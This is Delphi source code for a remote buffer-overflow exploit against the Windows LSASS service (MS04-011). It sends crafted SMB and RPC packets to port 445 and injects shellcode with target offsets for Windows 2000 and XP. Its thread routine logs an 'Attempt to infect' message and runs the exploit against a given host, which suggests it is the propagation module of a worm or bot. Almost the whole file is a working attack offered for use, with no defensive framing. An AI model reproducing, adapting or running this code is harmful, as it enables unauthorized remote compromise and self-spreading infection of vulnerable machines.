{ *
  MS04011 Lsasrv.dll RPC buffer overflow remote exploit for Delphi 7
  Written & modded by Morpheus (Darkerclone@hotmail.com)
  Tested:
    - Windows 2000 SP4
  I dont know if this is working on windows xp, but it might do so.
    - No Shell Crash Code(Exit Thread on w2k);

  Credit & Source : HOD-ms04011-lsasrv-expl.c ( houseofdabus )
* }

unit lsass;

interface

Procedure DoLsass(Host:String);

implementation

uses
  SysUtils,
  windows,
  winsock,
  classes,
  stuff,
  shellcode;

Const
  LEN = 3500;
  BUFSIZE = 2000;
  NOP = $90;
  win2offset:longint= $751c123c; // jmp ebx addr
  winxpoffset:longint = $01004600; // jmp esp addr
  strasm:string = #$66#$81#$EC#$1C#$07#$FF#$E4;

req1:string =
#$00#$00#$00#$85#$FF#$53#$4D#$42#$72#$00#$00#$00#$00#$18#$53#$C8+
#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$FF#$FE+
#$00#$00#$00#$00#$00#$62#$00#$02#$50#$43#$20#$4E#$45#$54#$57#$4F+
#$52#$4B#$20#$50#$52#$4F#$47#$52#$41#$4D#$20#$31#$2E#$30#$00#$02+
#$4C#$41#$4E#$4D#$41#$4E#$31#$2E#$30#$00#$02#$57#$69#$6E#$64#$6F+
#$77#$73#$20#$66#$6F#$72#$20#$57#$6F#$72#$6B#$67#$72#$6F#$75#$70+
#$73#$20#$33#$2E#$31#$61#$00#$02#$4C#$4D#$31#$2E#$32#$58#$30#$30+
#$32#$00#$02#$4C#$41#$4E#$4D#$41#$4E#$32#$2E#$31#$00#$02#$4E#$54+
#$20#$4C#$4D#$20#$30#$2E#$31#$32#$00;


req2:string =
#$00#$00#$00#$A4#$FF#$53#$4D#$42#$73#$00#$00#$00#$00#$18#$07#$C8+
#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$FF#$FE+
#$00#$00#$10#$00#$0C#$FF#$00#$A4#$00#$04#$11#$0A#$00#$00#$00#$00+
#$00#$00#$00#$20#$00#$00#$00#$00#$00#$D4#$00#$00#$80#$69#$00#$4E+
#$54#$4C#$4D#$53#$53#$50#$00#$01#$00#$00#$00#$97#$82#$08#$E0#$00+
#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00+
#$57#$00#$69#$00#$6E#$00#$64#$00#$6F#$00#$77#$00#$73#$00#$20#$00+
#$32#$00#$30#$00#$30#$00#$30#$00#$20#$00#$32#$00#$31#$00#$39#$00+
#$35#$00#$00#$00#$57#$00#$69#$00#$6E#$00#$64#$00#$6F#$00#$77#$00+
#$73#$00#$20#$00#$32#$00#$30#$00#$30#$00#$30#$00#$20#$00#$35#$00+
#$2E#$00#$30#$00#$00#$00#$00#$00;


req3:string =
#$00#$00#$00#$DA#$FF#$53#$4D#$42#$73#$00#$00#$00#$00#$18#$07#$C8+
#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$FF#$FE+
#$00#$08#$20#$00#$0C#$FF#$00#$DA#$00#$04#$11#$0A#$00#$00#$00#$00+
#$00#$00#$00#$57#$00#$00#$00#$00#$00#$D4#$00#$00#$80#$9F#$00#$4E+
#$54#$4C#$4D#$53#$53#$50#$00#$03#$00#$00#$00#$01#$00#$01#$00#$46+
#$00#$00#$00#$00#$00#$00#$00#$47#$00#$00#$00#$00#$00#$00#$00#$40+
#$00#$00#$00#$00#$00#$00#$00#$40#$00#$00#$00#$06#$00#$06#$00#$40+
#$00#$00#$00#$10#$00#$10#$00#$47#$00#$00#$00#$15#$8A#$88#$E0#$48+
#$00#$4F#$00#$44#$00#$00#$81#$19#$6A#$7A#$F2#$E4#$49#$1C#$28#$AF+
#$30#$25#$74#$10#$67#$53#$57#$00#$69#$00#$6E#$00#$64#$00#$6F#$00+
#$77#$00#$73#$00#$20#$00#$32#$00#$30#$00#$30#$00#$30#$00#$20#$00+
#$32#$00#$31#$00#$39#$00#$35#$00#$00#$00#$57#$00#$69#$00#$6E#$00+
#$64#$00#$6F#$00#$77#$00#$73#$00#$20#$00#$32#$00#$30#$00#$30#$00+
#$30#$00#$20#$00#$35#$00#$2E#$00#$30#$00#$00#$00#$00#$00;


req4:string =(
#$00#$00#$00#$5C#$FF#$53#$4D#$42#$75#$00#$00#$00#$00#$18#$07#$C8+
#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$FF#$FE+
#$00#$08#$30#$00#$04#$FF#$00#$5C#$00#$08#$00#$01#$00#$31#$00#$00+
#$5C#$00#$5C#$00#$31#$00#$39#$00#$32#$00#$2E#$00#$31#$00#$36#$00+
#$38#$00#$2E#$00#$31#$00#$2E#$00#$32#$00#$31#$00#$30#$00#$5C#$00+
#$49#$00#$50#$00#$43#$00#$24+
#$00#$00#$00#$3F#$3F#$3F#$3F#$3F#$00);

req5:string =
#$00#$00#$00#$64#$FF#$53#$4D#$42#$A2#$00#$00#$00#$00#$18#$07#$C8+
#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$08#$DC#$04+
#$00#$08#$40#$00#$18#$FF#$00#$DE#$DE#$00#$0E#$00#$16#$00#$00#$00+
#$00#$00#$00#$00#$9F#$01#$02#$00#$00#$00#$00#$00#$00#$00#$00#$00+
#$00#$00#$00#$00#$03#$00#$00#$00#$01#$00#$00#$00#$40#$00#$00#$00+
#$02#$00#$00#$00#$03#$11#$00#$00#$5C#$00#$6C#$00#$73#$00#$61#$00+
#$72#$00#$70#$00#$63#$00#$00#$00;

req6:string =
#$00#$00#$00#$9C#$FF#$53#$4D#$42#$25#$00#$00#$00#$00#$18#$07#$C8+
#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$08#$DC#$04+
#$00#$08#$50#$00#$10#$00#$00#$48#$00#$00#$00#$00#$04#$00#$00#$00+
#$00#$00#$00#$00#$00#$00#$00#$00#$00#$54#$00#$48#$00#$54#$00#$02+
#$00#$26#$00#$00#$40#$59#$00#$10#$5C#$00#$50#$00#$49#$00#$50#$00+
#$45#$00#$5C#$00#$00#$00#$00#$00#$05#$00#$0B#$03#$10#$00#$00#$00+
#$48#$00#$00#$00#$01#$00#$00#$00#$B8#$10#$B8#$10#$00#$00#$00#$00+
#$01#$00#$00#$00#$00#$00#$01#$00#$6A#$28#$19#$39#$0C#$B1#$D0#$11+
#$9B#$A8#$00#$C0#$4F#$D9#$2E#$F5#$00#$00#$00#$00#$04#$5D#$88#$8A+
#$EB#$1C#$C9#$11#$9F#$E8#$08#$00#$2B#$10#$48#$60#$02#$00#$00#$00;

req7 : string =
#$00#$00#$0C#$F4#$FF#$53#$4D#$42#$25#$00#$00#$00#$00#$18#$07#$C8+
#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$08#$DC#$04+
#$00#$08#$60#$00#$10#$00#$00#$A0#$0C#$00#$00#$00#$04#$00#$00#$00+
#$00#$00#$00#$00#$00#$00#$00#$00#$00#$54#$00#$A0#$0C#$54#$00#$02+
#$00#$26#$00#$00#$40#$B1#$0C#$10#$5C#$00#$50#$00#$49#$00#$50#$00+
#$45#$00#$5C#$00#$00#$00#$00#$00#$05#$00#$00#$03#$10#$00#$00#$00+
#$A0#$0C#$00#$00#$01#$00#$00#$00#$88#$0C#$00#$00#$00#$00#$09#$00+
#$EC#$03#$00#$00#$00#$00#$00#$00#$EC#$03#$00#$00;


// room for shellcode here ...

shit1 : string =

#$95#$14#$40#$00#$03#$00#$00#$00#$7C#$70#$40#$00#$01#$00#$00#$00+
#$00#$00#$00#$00#$01#$00#$00#$00#$00#$00#$00#$00#$01#$00#$00#$00+
#$00#$00#$00#$00#$01#$00#$00#$00#$00#$00#$00#$00#$01#$00#$00#$00+
#$00#$00#$00#$00#$01#$00#$00#$00#$00#$00#$00#$00#$01#$00#$00#$00+
#$00#$00#$00#$00#$01#$00#$00#$00#$00#$00#$00#$00#$7C#$70#$40#$00+
#$01#$00#$00#$00#$00#$00#$00#$00#$01#$00#$00#$00#$00#$00#$00#$00+
#$7C#$70#$40#$00#$01#$00#$00#$00#$00#$00#$00#$00#$01#$00#$00#$00+
#$00#$00#$00#$00#$7C#$70#$40#$00#$01#$00#$00#$00#$00#$00#$00#$00+
#$01#$00#$00#$00#$00#$00#$00#$00#$78#$85#$13#$00#$AB#$5B#$A6#$E9;

req8 : string  =
#$00#$00#$10#$F8#$FF#$53#$4D#$42#$2F#$00#$00#$00#$00#$18#$07#$C8+
#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$08#$FF#$FE+
#$00#$08#$60#$00#$0E#$FF#$00#$DE#$DE#$00#$40#$00#$00#$00#$00#$FF+
#$FF#$FF#$FF#$08#$00#$B8#$10#$00#$00#$B8#$10#$40#$00#$00#$00#$00+
#$00#$B9#$10#$EE#$05#$00#$00#$01#$10#$00#$00#$00#$B8#$10#$00#$00+
#$01#$00#$00#$00#$0C#$20#$00#$00#$00#$00#$09#$00#$AD#$0D#$00#$00+
#$00#$00#$00#$00#$AD#$0D#$00#$00;
// room for shellcode here ...

req9 : string =
#$00#$00#$0F#$D8#$FF#$53#$4D#$42#$25#$00#$00#$00#$00#$18#$07#$C8+
#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$08#$18#$01+
#$00#$08#$70#$00#$10#$00#$00#$84#$0F#$00#$00#$00#$04#$00#$00#$00+
#$00#$00#$00#$00#$00#$00#$00#$00#$00#$54#$00#$84#$0F#$54#$00#$02+
#$00#$26#$00#$00#$40#$95#$0F#$00#$5C#$00#$50#$00#$49#$00#$50#$00+
#$45#$00#$5C#$00#$00#$00#$00#$00#$05#$00#$00#$02#$10#$00#$00#$00+
#$84#$0F#$00#$00#$01#$00#$00#$00#$6C#$0F#$00#$00#$00#$00#$09#$00;


shit3:string =
#$00#$00#$00#$00#$9A#$A8#$40#$00#$01#$00#$00#$00#$00#$00#$00#$00+
#$01#$00#$00#$00#$00#$00#$00#$00#$01#$00#$00#$00#$00#$00#$00#$00+
#$01#$00#$00#$00#$00#$00#$00#$00#$01#$00#$00#$00#$00#$00#$00#$00+
#$01#$00#$00#$00+
#$00#$00#$00#$00#$01#$00#$00#$00#$00#$00#$00#$00#$01#$00#$00#$00+
#$00#$00#$00#$00#$9A#$A8#$40#$00#$01#$00#$00#$00#$00#$00#$00#$00+
#$01#$00#$00#$00#$00#$00#$00#$00#$9A#$A8#$40#$00#$01#$00#$00#$00+
#$00#$00#$00#$00#$01#$00#$00#$00#$00#$00#$00#$00#$9A#$A8#$40#$00+
#$01#$00#$00#$00#$00#$00#$00#$00#$01#$00#$00#$00#$00#$00#$00#$00;

Type
  dLsass = class(TThread)
  Private
    hostipc:string[40];
    hostipc2:array[1..80] of char;
    sc:string;
    buf:Array[1..len] of Char;
    sendbuf:Array[1..(LEN+1)*2-1] of Char;
    req4u:array[1..116] of char;
    screq:Array[1..BUFSIZE+125+1500+440] of Char;
    screq2k:array[1..4348+4060-1] of Char;
    screq2k2:array[1..4348+4060-1] of Char;
    recvbuf:Array[0..1600-1] of Char;
    strBuffer:Array[1..BUFSIZE] of Char;
    sockfd:TSocket;
    their_addr:TSockAddrIn;
    smblen,unclen:char;
    lenn:longint;
    target:string;
  protected
    Procedure Execute; override;
    Procedure WINXP;
    Procedure WIN2K;
    Function MAIN(L:Boolean):Boolean;
    Constructor Create(host:string);
   end;

Constructor dLsass.Create(host:string);
begin
  inherited Create(false);
  FreeOnTerminate := True;
  Target:=Host;
end;


Procedure dLsass.WIN2K;
Var i:Integer;
begin
  fillchar(buf,len,nop);
  Move(win2offset,buf[2020+1],4);
  move(pointer(sc)^,buf[2036+1],length(sc));
  move(#$eb#$06#$eb#$06,buf[2840+1],4);
  move(win2offset,buf[2844+1],4);  // Check down ---
  Move(pointer(sc)^,buf[2856+1],length(sc));
  for i:=1 to len  do
  begin
                sendbuf[i*2-1] := buf[i];
                sendbuf[i*2+1-1] := #0;
  end;
  sendbuf[LEN*2+1]:=#0;
  FillChar(screq2k,(BUFSIZE+length(req7)+1500+1)*2,$31);
  FillChar(screq2k2,(BUFSIZE+length(req7)+1500+1)*2,$31);
  move(pointer(req8)^,screq2k,length(req8));
  move(sendbuf,screq2k[length(req8)+1],(LEN+1)*2);
  move(pointer(req9)^,screq2k2,length(req9));
  move(sendbuf[4244],screq2k2[length(req9)],(LEN+1)*2-4348+1);
  move(pointer(shit3)^,screq2k2[2868+1],length(shit3));
  if (send(sockfd, screq2k, 4348, 0) = -1) then
    Exit;
  lenn := recv(sockfd, recvbuf, 1600, 0);
  if (send(sockfd, screq2k2, 4060, 0) = -1) then
    Exit;
  lenn := recv(sockfd, recvbuf, 1600, 0);
end;

Procedure dLsass.WINXP;
begin
  FillChar(StrBuffer,BUFSIZE,nop);
  move(pointer(sc)^,strBuffer[160+1] ,length(sc));
  move(pointer(strasm)^,strBuffer[1980+1],length(strasm));
  move(winxpoffset,strbuffer[1964+1],4);
  Fillchar(screq, BUFSIZE+length(req7)+1500+1,$31);
  move(pointer(req7)^,screq,length(req7)+1);
  move(strBuffer,screq[length(req7)+1],BUFSIZE);
  move(pointer(shit1)^,screq[length(req7)+BUFSIZE+1],9*16);
  screq[BUFSIZE+length(req7)-1+1500-304-1+2] := #0;
  if (send(sockfd, screq, BUFSIZE+length(req7)-1+1500-304+1, 0)= -1) then
    Exit;
  lenn := recv(sockfd, recvbuf, 1600, 0);
end;

Function dLsass.MAIN;
var i:integer;
begin
  result:=false;
  hostipc:='\\'+target+'\ipc$';
  for i:=1 to 40 do
  begin
    hostipc2[i*2-1] := hostipc[i];
    hostipc2[i*2+1-1] := #0;
  end;
  move(pointer(req4)^,req4u,length(req4));
  move(hostipc2,req4u[48+1],length(hostipc)*2);
  move(req4u[87+1],req4u[47+1+length(hostipc)*2],9);
  smblen:=char(52+length(hostipc)*2);
  move(smblen,req4u[4], 1);
  unclen := char(9+length(hostipc)*2);
  move(unclen,req4u[46], 1);
  sockfd:=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
  if sockfd = -1 then
    exit; // SOCK ERROR
  their_addr.sin_family := AF_INET;
  their_addr.sin_port := htons(445);
  their_addr.sin_addr.S_addr := inet_addr(Pchar(Target));
  fillChar(their_addr.sin_zero,8,#0);
  if (connect(sockfd, their_addr, sizeof(their_addr)) = -1) then
    exit; // CANT CONNECT
  if (send(sockfd, Pointer(req1)^, length(req1), 0) = -1) then
    exit;
  lenn := recv(sockfd, recvbuf, 1600, 0);
  if (send(sockfd, Pointer(req2)^, length(req2), 0) = -1) then
    exit;
  lenn := recv(sockfd, recvbuf, 1600, 0);
  if (send(sockfd, Pointer(req3)^, length(req3), 0) = -1) then
    exit;
  lenn := recv(sockfd, recvbuf, 1600, 0);
  case recvbuf[68] of  // check os type
    '1':i:=1;
    '0':i:=0;
    else
      i:=3;
  end;
  if (send(sockfd, req4u, ord(smblen)+4, 0) = -1) then
    exit;
  lenn := recv(sockfd, recvbuf, 1600, 0);
  if (send(sockfd, pointer(req5)^, length(req5), 0) = -1)  then
    exit;
  lenn := recv(sockfd, recvbuf, 1600, 0);
  if (send(sockfd, pointer(req6)^, length(req6), 0) = -1) then
    exit;
  sc := shellcode.FTP_Shellcode(L);
  case i of
    1:WinXp;
    0:Win2K;
    3:begin
        WinXP;
        Win2K;
      end;
  end;
  Result:=true;
end;

Procedure dLsass.Execute;
begin
  SendSock('[LSASS] Attempt to infect: '+Target);
  main(true);
  sleep(30000);
  main(false);
  //if (Main(False)) or (Main(True)) then SendSock('[LSASS] Infected: '+Target);
  Terminate; // Exit thread;
end;

Procedure DoLsass;
var l:dLsass;
begin
  l:=dLsass.Create(host);
end;

end.

